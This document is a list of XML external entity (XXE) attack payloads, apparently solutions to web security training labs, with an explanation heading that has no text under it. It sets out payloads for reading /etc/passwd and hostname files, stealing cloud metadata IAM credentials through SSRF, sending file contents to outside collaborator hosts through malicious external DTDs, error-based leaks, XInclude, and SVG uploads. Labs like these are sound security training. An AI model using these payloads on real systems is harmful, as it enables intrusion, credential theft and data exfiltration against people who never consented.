 
### Exploiting XXE using external entities to retrieve files
**Payload** :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Exploiting XXE to perform SSRF attacks
**Payload** : 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
<productId>
&xxe;
</productId><storeId>3</storeId></stockCheck>
```

### Blind XXE with out-of-band interaction
**Payload** :
```xml
<?xml version="1.0" encoding="UTF-8"?>
			<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://o5u21yqajch2ke0bv6f8ojy5swynmda2.oastify.com"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

### Blind XXE with out-of-band interaction via XML parameter entities
**Payload** :
```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://dhyrdn2zv1trw3c07vrx08au4lacy3ms.oastify.com"> %xxe; ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```
**Penjelasan** :

### Exploiting XInclude to retrieve files
**Payload** :
```xml
productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=3
```
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text"+href="file:///etc/passwd"/></foo>
```

### Exploiting blind XXE to exfiltrate data using a malicious external DTD
**Payload** :
Exploit Server (/exploit.dtd)
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://fk3npj8klxavp8498t9k5yc7qywpkf84.oastify.com/?x=%file;'>">
%eval;
%exfil;
```

Payload :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a07007e032351b1809ae3f301d00008.exploit-server.net/exploit.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>3</storeId></stockCheck>
```

### Exploiting blind XXE to retrieve data via error messages
**Payload**
Exploit Server (/exploit.dtd)
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ae4003b03188f5a8081a7e701f900a7.exploit-server.net/exploit.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>3</storeId></stockCheck>
```

### Exploiting XXE via image file upload
**Payload** :
Create svg file
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

